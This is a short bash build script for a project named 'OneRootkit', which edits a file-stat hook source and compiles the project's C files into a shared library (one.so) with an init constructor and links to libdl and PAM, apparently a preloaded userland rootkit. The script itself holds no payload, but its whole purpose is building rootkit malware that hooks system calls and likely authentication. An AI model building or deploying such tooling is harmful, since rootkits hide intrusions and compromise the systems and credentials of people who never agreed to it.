#!/bin/bash

cd `dirname $0`

BRAND="OneRootkit"
SRCDIR="src"
C_SRC_FILES=`find $SRCDIR -type f -name "*.c"`
#C_FLAGS="-s"
C_FLAGS=""

sed 's/^gint.*stat64.*;$//' src/One/Hooks/Stat.c > tmp.c
cat tmp.c > src/One/Hooks/Stat.c
rm tmp.c
FILE_SAFE=`echo "$C_SRC_FILES" | sed ':a;N;$!ba;s/\n/ /g'`
echo "[MINIMAL] Building $FILE_SAFE"
gcc -m64 -o one.so -shared -fPIC -Wl,-init,init -Iinclude -O3 $C_FLAGS $C_SRC_FILES -ldl -lpam && echo "[MINIMAL] one.so compiled"
